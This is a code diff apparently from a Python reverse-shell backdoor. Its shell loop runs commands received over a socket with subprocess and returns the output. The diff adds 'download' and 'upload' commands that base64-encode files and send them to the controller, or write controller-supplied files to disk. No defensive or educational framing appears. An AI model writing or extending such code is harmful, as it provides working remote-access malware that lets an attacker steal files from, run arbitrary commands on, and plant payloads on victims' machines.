@@ -6,6 +6,7 @@ import socket
 import subprocess 
 import json
 import os
+import base64
 
 def reliable_send(data):
     jsonData = json.dumps(data.decode())
@@ -30,6 +31,13 @@ def shell():
                 os.chdir(command[3:])
             except:
                 continue
+        elif command[:8] == "download":
+            with open(command[9:], "rb") as download:
+                reliable_send(base64.b64encode(download.read()))
+        elif command[:6] == "upload": #Work in Progress
+            with open(command[7:], "wb") as upload:
+                fileData = reliable_recv()
+                upload.write(base64.b64decode(fileData))
         else:
             proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             result = proc.stdout.read() + proc.stderr.read()
